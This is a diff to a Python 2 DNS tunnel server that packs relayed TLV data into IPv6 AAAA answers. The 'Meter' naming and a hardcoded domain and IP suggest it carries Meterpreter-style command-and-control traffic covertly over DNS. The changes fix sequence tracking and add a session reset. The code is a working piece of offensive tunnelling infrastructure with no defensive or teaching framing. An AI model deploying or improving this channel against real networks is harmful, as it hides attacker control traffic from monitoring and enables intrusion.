@@ -59,10 +59,10 @@ class DNSTunnelResponse():
         self.ansx = TLV_REQX  # Block of IPv6 addresses
         max_size = 14 * 16
         cur_seq = start
-        cur_seq1 = DNSTunnelResponse.inc(cur_seq)
+        self.cur_seq1 = DNSTunnelResponse.inc(cur_seq)
         
         # next domain name
-        ip_seq = "fe81:" + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(cur_seq1)]) +  '00:'
+        ip_seq = "fe81:" + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(self.cur_seq1)]) +  '00:'
         
         cntx = 0
         t_size = len(data) # TLV size
@@ -148,10 +148,10 @@ class DNSTunnelResponse():
                 
             if t_size !=0 :
                 cur_seq = DNSTunnelResponse.inc(cur_seq)
-                cur_seq1 = DNSTunnelResponse.inc(cur_seq)
+                self.cur_seq1 = DNSTunnelResponse.inc(cur_seq)
                     
                 # Next block and header
-                ip_seq = 'fe81:' + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(cur_seq1)]) + '00:'
+                ip_seq = 'fe81:' + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(self.cur_seq1)]) + '00:'
                     
                 cntx = 0
                 for_pack = data[curr_point:curr_point + max_size]
@@ -172,10 +172,12 @@ class DNSTunnelResponse():
                 break
         
     def get_ipv6(self):
-        return self.ansx
+        return (self.ansx, self.cur_seq1)
         
 D = DomainName('0x41.ws.')
 IP = '54.194.143.85'
+
+
 TTL = 1
 
 
@@ -212,16 +214,17 @@ TLV_RES = {'rdy': False}
 MAX_SIZE = 14 * 16 # Maximum size of DNS reponse (IPv6)
 
 curr_sub_ = "aaaa"
-
+new_start = "aaaa"
 
 def add_meter_request(data):
     global TLV_REQ
     global curr_sub_
+    global new_start
     while 'y' + curr_sub_ not in TLV_REQ:
         time.sleep(0.1)
     print("NEW REQUEST: GOGO! " + curr_sub_)   
     print " ".join([ hex(ord(ch))[2:] for ch in data ])
-    TLV_REQ = DNSTunnelResponse(data, TLV_REQ, curr_sub_).get_ipv6() 
+    (TLV_REQ, new_start) = DNSTunnelResponse(data, TLV_REQ, curr_sub_).get_ipv6() 
     del TLV_REQ['y' + curr_sub_]
     
     return True
@@ -261,6 +264,7 @@ def dns_response_(request):
     global TLV_REQ
     global TLV_RES
     global curr_sub_       
+    global new_start
     print("\n\nINCOMING: ")
 
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
@@ -303,12 +307,15 @@ def dns_response_(request):
             mx = mc
         else:
             mx = None
-            
-        if mx and 'y' + mx.group('sub_dom') in TLV_REQ:
+        if mx and mx.group('sub_dom') == "aaaa" and curr_sub_!="aaaa":
+            TLV_REQ = {}
+            TLV_REQ['y' + curr_sub_] = True
+            TLV_RES = {'rdy': False}
+            curr_sub_ = "aaaa"
+            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000")))  
+        elif mx and 'y' + mx.group('sub_dom') in TLV_REQ:
             print "Return WAITING for " + mx.group('sub_dom')
-            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000")))
-
-            
+            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000")))  
         elif mx and mx.group('sub_dom') in TLV_REQ:
             print("Return DATA for" + mx.group('sub_dom'))
             for ip in TLV_REQ[mx.group('sub_dom')]:
@@ -507,7 +514,6 @@ class MeterBaseRequestHandler(SocketServer.BaseRequestHandler):
                 print "Server said {}".format(" ".join([ hex(ord(ch))[2:] for ch in data ]))
                 add_meter_request(data)
                 return_tlv = get_meter_response()
-                
             
             if return_tlv:
                 print "Client said {}".format(" ".join([ hex(ord(ch))[2:] for ch in return_tlv ]))
